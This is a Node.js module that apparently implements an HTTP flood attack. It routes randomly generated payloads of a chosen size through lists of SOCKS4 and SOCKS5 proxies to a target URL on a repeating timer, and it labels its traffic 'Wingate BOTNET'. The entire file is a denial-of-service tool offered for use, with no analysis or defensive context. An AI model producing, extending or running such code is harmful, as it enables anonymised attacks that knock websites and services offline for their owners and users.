const http = require('http');
const fs = require('fs');
const { SocksClient } = require('socks');

const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);

function generatePayload(kbSize) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let payload = '';
    for (let i = 0; i < kbSize * 1024; i++) {
        payload += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return payload;
}

async function sendPacket(targetUrl, proxy, delay, kbSize) {
    return new Promise((resolve, reject) => {
        const [proxyIp, proxyPort] = proxy.split(':');
        const target = new URL(targetUrl);
        const payload = generatePayload(kbSize);

        const options = {
            proxy: {
                ipaddress: proxyIp,
                port: parseInt(proxyPort),
                type: socks4Proxies.includes(proxy) ? 4 : 5, 
            },
            destination: {
                host: target.hostname,
                port: target.port || 80,
            },
            command: 'connect',
            timeout: 5000, 
        };

        SocksClient.createConnection(options, (err, info) => {
            if (err) {
                console.error(`Failed to connect to ${targetUrl} via ${proxy}: ${err.message}`);
                reject(err);
                return;
            }

            const req = http.request({
                host: target.hostname,
                port: target.port || 80,
                path: target.pathname,
                method: 'GET',
                headers: {
                    'User-Agent': 'Wingate BOTNET',
                    'Content-Length': Buffer.byteLength(payload),
                },
                socket: info.socket, 
            }, (res) => {
                console.log(`Packet sent to ${targetUrl} via ${proxy} with ${kbSize}KB payload`);
                resolve();
            });

            req.on('error', (err) => {
                console.error(`Failed to send packet to ${targetUrl} via ${proxy}: ${err.message}`);
                reject(err);
            });

            req.write(payload);
            req.end();

            if (delay > 0) {
                setTimeout(() => {}, delay);
            }
        });
    });
}

function start(targetUrl, delay, kbSize) {
    setInterval(() => {
        const proxyList = Math.random() < 0.5 ? socks4Proxies : socks5Proxies;
        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];

        sendPacket(targetUrl, proxy, delay, kbSize).catch(() => {});
    }, delay);
}

module.exports = { start };
